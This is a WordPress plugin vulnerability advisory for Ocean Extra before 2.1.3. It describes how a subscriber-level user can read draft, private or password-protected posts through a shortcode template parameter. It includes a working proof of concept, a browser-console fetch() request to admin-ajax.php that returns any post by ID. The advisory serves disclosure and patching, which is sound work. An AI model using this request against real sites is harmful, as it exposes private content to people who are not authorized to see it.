## WordPress Plugin Vulnerabilities

# Ocean Extra < 2.1.3 - Subscriber+ Arbitrary Post Content Disclosure

### Description

The plugin does not ensure that the template to be loaded via a shortcode is actually a template, allowing any authenticated users such as subscriber to retrieve the content of arbitrary posts, such as draft, private or even password protected ones.

### Proof of Concept

Note: This requires the OceanWP theme to be installed and active
Run the below command in the developer console of the web browser while being on the blog as a subscriber
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[oceanwp\_library id='14']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
This will display the content of the post with ID 14
